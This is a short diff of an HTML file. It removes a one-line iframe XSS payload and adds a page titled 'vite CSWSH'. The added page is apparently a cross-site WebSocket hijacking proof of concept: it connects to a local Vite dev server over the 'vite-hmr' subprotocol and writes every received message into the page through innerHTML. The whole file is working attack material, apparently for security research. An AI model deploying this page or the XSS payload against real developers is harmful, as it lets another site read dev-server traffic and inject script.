@@ -1,1 +1,19 @@
-<iframe/src=javascript://%0aalert('XSS')>
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <title>vite CSWSH</title>
+    </head>
+    <body>
+        <div id="logs"></div>
+        <script>
+            const div = document.querySelectorAll('#logs')[0];
+            const ws = new WebSocket('ws://localhost:5173','vite-hmr');
+            ws.onmessage = event => {
+                const logLine = document.createElement('p');
+                logLine.innerHTML = event.data;
+                div.append(logLine);
+            };
+        </script>
+    </body>
+</html>
